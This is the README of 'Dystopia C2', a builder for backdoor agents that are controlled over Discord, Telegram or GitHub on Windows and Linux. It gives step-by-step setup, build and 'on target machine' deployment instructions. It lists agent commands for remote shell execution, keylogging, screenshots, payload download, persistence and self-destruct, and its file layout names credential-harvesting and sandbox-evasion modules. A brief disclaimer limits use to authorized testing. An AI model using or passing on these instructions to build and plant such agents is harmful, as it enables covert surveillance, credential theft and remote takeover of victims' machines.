<h1 align="center">
  <br>
  <a href="https://github.com/TarzEH/dystopia-c2"><img src="https://i.ibb.co/qY09wWK/download-2.png" width=600 alt="Dystopia"></a>
  <br>
  Dystopia C2
  <br>
</h1>

<h4 align="center">Discord / Telegram / GitHub C2 agent builder — Windows + Linux</h4>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows_%7C_Linux-blue">
  <img src="https://img.shields.io/badge/Version-3.0-blue">
  <img src="https://img.shields.io/badge/Python-3.8+-blue">
</p>

---

Dystopia is a payload builder that generates agents (backdoors) communicating over Discord, Telegram, or GitHub as C2 channels. Agents talk **outbound HTTPS only** — no listener or open port required.

> **Fork note:** this is [TarzEH/dystopia-c2](https://github.com/TarzEH/dystopia-c2), forked from [3ct0s/dystopia-c2](https://github.com/3ct0s/dystopia-c2). Adds Linux agent support, AES-256-GCM secret obfuscation, operator allowlist, batch builds, and a unified builder.

## Features

- **Discord, Telegram, GitHub** C2 channels
- **Windows + Linux** agent targets
- **AES-256-GCM** secret obfuscation in packaged agents (default on)
- **Operator allowlist** — fail-closed; empty allowlist blocks builds and denies commands
- **Interactive REPL** or **batch/automation** mode (`--env` / `--batch`)
- Shell commands, keylogger (Discord), screenshot, webcam, file upload/download, persistence, self-destruct

## Installation

```bash
git clone https://github.com/TarzEH/dystopia-c2.git
cd dystopia-c2

python3 -m venv .venv
source .venv/bin/activate
pip install -U pip
pip install -r requirements.txt
```

**Windows EXE builds** additionally require Wine + Python 3.8.9 (win32) under Wine + PyInstaller. See the upstream wiki for the Wine toolchain setup.

## Discord setup (quick)

1. [Developer Portal](https://discord.com/developers/applications) → New Application → Bot
2. Enable **Message Content Intent**
3. Set **Public Bot** → OFF
4. Set **Default Authorization Link** → None
5. Invite bot to a **private** guild with: Send Messages, Embed Links, Attach Files, Read Message History
6. Create a `#keylogger` channel → add a Webhook (for keylog reports)
7. Copy: Guild ID, Channel ID, Bot Token, Webhook URL, your User ID

## Configuration

Copy the example env and fill in your values:

```bash
cp discord.env.example discord.env
chmod 600 discord.env
# Edit discord.env with your Discord credentials
```

Or use the system-wide path:

```bash
sudo mkdir -p /etc/dystopia
sudo cp discord.env.example /etc/dystopia/discord.env
sudo chmod 600 /etc/dystopia/discord.env
```

See [`discord.env.example`](discord.env.example) for all available options.

**Never commit `discord.env` or any file containing real tokens.** The `.gitignore` already excludes `*.env` (except `*.env.example`).

## Usage

### Interactive

```bash
.venv/bin/python builder.py
```

```
use discord
set target linux
set name my-agent
set guild-id <GUILD_ID>
set bot-token <BOT_TOKEN>
set channel-id <CHANNEL_ID>
set webhook <WEBHOOK_URL>
set operator-ids <YOUR_USER_ID>
set obfuscate true
build
```

### Batch / automation

```bash
# From env file
.venv/bin/python builder.py --env discord.env

# Or from default path (/etc/dystopia/discord.env)
.venv/bin/python builder.py --batch
```

### Build output

| Target | Pack | Output |
|--------|------|--------|
| Linux | `script` (default) | `dist/<name>-linux/` → `agent.py`, `run.sh`, `libraries/`, `requirements.txt` |
| Linux | `onefile` | `dist/<name>` (single ELF binary via PyInstaller) |
| Windows | `auto` / `exe` | `dist/<name>.exe` (PyInstaller under Wine) |

### Deploy (Linux script pack)

```bash
# On target machine
cd dist/<name>-linux/
pip install -r requirements.txt
python3 agent.py
# Or simply:
./run.sh
```

## Agent commands (Discord)

| Command | Description |
|---------|-------------|
| `!ls` | List online agents |
| `!interact <id>` | Select an agent |
| `!cmd <command>` | Run shell command |
| `!keylog start <interval>` | Start keylogger (reports to webhook channel) |
| `!keylog stop` | Stop keylogger |
| `!screenshot` | Capture screen |
| `!upload <url> <name>` | Download file to target |
| `!persist` | Install persistence |
| `!selfdestruct` | Remove agent from target |
| `!info` | Agent system info |
| `!help` | Full command list |

> One bot token = one live gateway session. Don't run two agents with the same token simultaneously.

## File structure

```
builder.py              # Unified builder (interactive + batch)
discord.env.example     # Env template (safe to commit)
requirements.txt        # All dependencies (builder + agent runtime)
code/
  discord/
    main.py             # Windows Discord agent template
    main_linux.py       # Linux Discord agent template
  telegram/main.py      # Telegram agent template
  github/main.py        # GitHub agent template
libraries/
  build_api.py          # Build logic (Win + Linux packing)
  obfuscate_build.py    # Build-time AES-256-GCM encryption
  secretbox.py          # Runtime secret decryption
  disctopia.py          # Windows agent ops
  linuxops.py           # Linux agent ops
  keylogger.py          # Windows keylogger
  keylogger_linux.py    # Linux keylogger (evdev)
  credentials.py        # Windows credential harvesting
  sandboxevasion.py     # Sandbox/VM detection
img/exe_file.ico        # Windows EXE icon
```

## Security notes

- **Operator allowlist is mandatory** — empty `DISCORD_OPERATOR_IDS` blocks the build
- **Obfuscation is on by default** — secrets are AES-encrypted in the agent; `obfuscate=false` is debug-only
- Treat `dist/` output as credential-equivalent — never upload to VirusTotal or share publicly
- Keep bot token in a `chmod 600` env file; rotate immediately if leaked
- Use a **dedicated private guild** — never reuse personal servers

## Disclaimer

This tool is for **educational purposes and authorized security testing only**. The developer is not responsible for any misuse. Do not use against systems you do not own or have explicit written permission to test.
